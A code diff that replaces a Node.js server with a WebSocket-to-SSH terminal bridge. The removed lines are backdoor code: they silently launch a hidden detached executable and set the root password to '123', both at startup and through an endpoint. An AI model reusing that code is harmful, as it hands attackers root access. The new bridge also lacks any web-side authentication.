@@ -1,173 +1,161 @@
-const express = require('express');
-const { exec, spawn } = require('child_process');
+// server.js
 const fs = require('fs');
 const path = require('path');
+const express = require('express');
+const http = require('http');
+const WebSocket = require('ws');
+const { Client } = require('ssh2');
 
 const app = express();
-const PORT = 3000;
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server, path: '/ssh' });
 
-// 静默启动服务
-app.get('/', (req, res) => {
-  res.send('服务运行中');
-});
+// Serve static frontend
+app.use(express.static(path.join(__dirname, 'public')));
 
-// 检查服务状态端点
-app.get('/status', (req, res) => {
-  checkServiceStatus().then(status => {
-    res.json({ status: status ? '运行中' : '未运行', success: status });
-  });
-});
+// Helper: attempt ssh connection
+function createSSHConnection(ws, auth) {
+  const conn = new Client();
 
-// 修改密码端点
-app.get('/setpass', (req, res) => {
-  setRootPassword().then(success => {
-    if (success) {
-      res.json({ message: '密码设置完成', success: true });
-    } else {
-      res.json({ message: '密码设置失败', success: false });
-    }
-  });
-});
-
-// 执行后台程序
-async function startService() {
-  console.log('启动后台服务...');
-  
-  try {
-    // 查找当前目录下的可执行文件
-    const files = fs.readdirSync('.');
-    const executableFiles = files.filter(file => {
-      try {
-        const stats = fs.statSync(file);
-        // 检查是否为文件且可执行
-        return stats.isFile() && 
-               (file.includes('apparm') || 
-                !path.extname(file) || 
-                file.endsWith('.sh') ||
-                (fs.accessSync(file, fs.constants.X_OK), true));
-      } catch {
-        return false;
-      }
-    });
-
-    if (executableFiles.length === 0) {
-      console.log('未找到可执行文件');
-      return false;
-    }
-
-    // 使用第一个找到的可执行文件
-    const executable = executableFiles[0];
-    console.log(`找到执行文件: ${executable}`);
-    
-    // 检查是否有配置文件
-    let configArgs = [];
-    if (fs.existsSync('app.ini')) {
-      configArgs = ['-c', 'app.ini'];
-    }
-
-    // 后台运行程序
-    const serviceProcess = spawn(`./${executable}`, configArgs, {
-      detached: true,
-      stdio: 'ignore',
-      shell: true
-    });
-    
-    serviceProcess.unref();
-    
-    // 等待一段时间后检查状态
-    await new Promise(resolve => setTimeout(resolve, 3000));
-    
-    const isRunning = await checkServiceStatus();
-    if (isRunning) {
-      console.log('服务启动成功');
-      return true;
-    } else {
-      console.log('服务启动可能失败');
-      return false;
-    }
-    
-  } catch (error) {
-    console.log('启动过程中出现异常');
-    return false;
-  }
-}
-
-// 设置root密码
-async function setRootPassword() {
-  console.log('设置系统访问...');
-  
-  try {
-    // 方法1: 使用chpasswd
-    await executeCommand('echo "root:123" | chpasswd');
-    console.log('密码设置完成');
-    return true;
-  } catch (error) {
-    try {
-      // 方法2: 使用passwd（非交互式）
-      await executeCommand('echo -e "123\\n123" | passwd root');
-      console.log('密码设置完成');
-      return true;
-    } catch (error2) {
-      try {
-        // 方法3: 直接修改shadow文件（需要权限）
-        await executeCommand('usermod -p $(openssl passwd -1 123) root');
-        console.log('密码设置完成');
-        return true;
-      } catch (error3) {
-        console.log('密码设置失败');
-        return false;
-      }
-    }
-  }
-}
-
-// 检查服务是否运行
-async function checkServiceStatus() {
-  return new Promise((resolve) => {
-    exec('ps aux', (error, stdout) => {
-      if (error) {
-        resolve(false);
+  conn.on('ready', () => {
+    console.log('SSH ready');
+    // request a shell (pty)
+    conn.shell({ term: auth.term || 'xterm-256color', cols: auth.cols || 80, rows: auth.rows || 24 }, (err, stream) => {
+      if (err) {
+        ws.send(JSON.stringify({ type: 'stderr', data: 'Shell error: ' + err.message }));
+        conn.end();
         return;
       }
-      
-      // 检查进程列表中是否有相关进程
-      const lines = stdout.split('\n');
-      const isRunning = lines.some(line => {
-        return line.includes('apparm') || 
-               line.includes('./') ||
-               (line.includes('ini') && !line.includes('grep'));
+
+      // data from ssh -> client
+      stream.on('data', (data) => {
+        if (ws.readyState === WebSocket.OPEN) {
+          ws.send(data);
+        }
       });
-      
-      resolve(isRunning);
+
+      stream.stderr.on('data', (data) => {
+        if (ws.readyState === WebSocket.OPEN) {
+          ws.send(data);
+        }
+      });
+
+      stream.on('close', () => {
+        try { ws.close(); } catch(e){ }
+        conn.end();
+      });
+
+      // store stream on ws for inbound data piping
+      ws.sshStream = stream;
     });
   });
+
+  conn.on('error', (err) => {
+    console.error('SSH error', err);
+    if (ws.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ type: 'error', message: 'SSH connection error: ' + err.message }));
+      ws.close();
+    }
+  });
+
+  conn.on('end', () => {
+    console.log('SSH ended');
+  });
+
+  // Build connection config
+  const cfg = {
+    host: auth.host || '127.0.0.1', // local host by default
+    port: auth.port || 22,
+    username: auth.username,
+    readyTimeout: 20000,
+  };
+
+  if (auth.password) cfg.password = auth.password;
+  else if (auth.privateKey) cfg.privateKey = auth.privateKey;
+  else if (process.env.SSH_PRIVATE_KEY_PATH && fs.existsSync(process.env.SSH_PRIVATE_KEY_PATH)) {
+    cfg.privateKey = fs.readFileSync(process.env.SSH_PRIVATE_KEY_PATH);
+  }
+
+  conn.connect(cfg);
+
+  // return conn to allow cleanup if needed
+  return conn;
 }
 
-// 执行命令函数
-function executeCommand(command) {
-  return new Promise((resolve, reject) => {
-    exec(command, (error, stdout, stderr) => {
-      if (error) {
-        reject(error);
+wss.on('connection', (ws, req) => {
+  console.log('WS connected from', req.socket.remoteAddress);
+
+  let sshConn = null;
+
+  ws.on('message', (msg) => {
+    // try parse JSON control messages; otherwise treat as raw input to ssh stream
+    // We expect first an auth JSON like: {type:"auth", username:"user", password:"...", host:"127.0.0.1", port:22}
+    // resize messages: {type:"resize", cols:..., rows:...}
+    try {
+      // note: remote clients may send binary shell data (Buffer), so only parse when it's stringified JSON
+      if (typeof msg === 'string') {
+        const j = JSON.parse(msg);
+        if (j.type === 'auth') {
+          // require username + (password || privateKey)
+          if (!j.username) {
+            ws.send(JSON.stringify({ type: 'error', message: 'Missing username' }));
+            ws.close();
+            return;
+          }
+          // If privateKey supplied as text, use it; else password.
+          if (j.privateKey) j.privateKey = j.privateKey.replace(/\\n/g, '\n');
+
+          // create the SSH connection
+          sshConn = createSSHConnection(ws, {
+            host: j.host || '127.0.0.1',
+            port: j.port || 22,
+            username: j.username,
+            password: j.password,
+            privateKey: j.privateKey,
+            cols: j.cols,
+            rows: j.rows,
+            term: j.term
+          });
+        } else if (j.type === 'resize') {
+          if (ws.sshStream && ws.sshStream.setWindow) {
+            ws.sshStream.setWindow(j.rows, j.cols, j.height || 600, j.width || 800);
+          }
+        } else if (j.type === 'keepalive') {
+          // ignore
+        } else {
+          // unknown control message
+        }
         return;
       }
-      resolve(stdout);
-    });
-  });
-}
-
-// 启动服务
-app.listen(PORT, () => {
-  console.log(`服务已启动:${PORT}`);
-  // 延迟执行后台程序
-  setTimeout(async () => {
-    const success = await startService();
-    if (success) {
-      console.log('后台服务运行完成');
-      // 自动设置密码
-      await setRootPassword();
-    } else {
-      console.log('后台服务启动失败');
+    } catch (e) {
+      // not JSON -> fallthrough to raw
     }
-  }, 1000);
+
+    // raw data (Buffer or string) to write to ssh
+    if (ws.sshStream && ws.sshStream.writable) {
+      // msg may be Buffer or string; write directly
+      ws.sshStream.write(msg);
+    } else {
+      // Not connected yet
+      ws.send(JSON.stringify({ type: 'stderr', data: 'SSH not connected yet. Send auth first.' }));
+    }
+  });
+
+  ws.on('close', () => {
+    console.log('WS closed');
+    if (sshConn) {
+      try { sshConn.end(); } catch(e){ }
+    }
+  });
+
+  ws.on('error', (err) => {
+    console.error('WS error', err);
+    if (sshConn) try { sshConn.end(); } catch(e){ }
+  });
+
+});
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+  console.log(`Server listening on ${PORT}. Open http://localhost:${PORT}/`);
 });
